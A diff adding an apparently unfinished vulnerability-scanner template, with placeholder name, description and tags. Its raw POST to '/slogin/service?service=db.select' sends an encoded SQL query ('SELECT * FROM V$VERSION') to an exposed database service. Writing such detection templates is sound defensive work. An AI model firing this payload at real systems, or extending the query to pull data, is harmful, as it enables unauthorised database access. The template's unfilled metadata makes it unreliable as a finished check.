@@ -1,0 +1,29 @@
+id: template-id
+info:
+  name: Template Name
+  author: '14332'
+  severity: info
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /slogin/service?service=db.select HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0
+        Content-Length: 58
+
+        params=%7B%22sql%22%3A%22SELECT+%2A+FROM+V%24VERSION%22%7D
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - values
+      - type: word
+        part: header
+        words:
+          - '200'
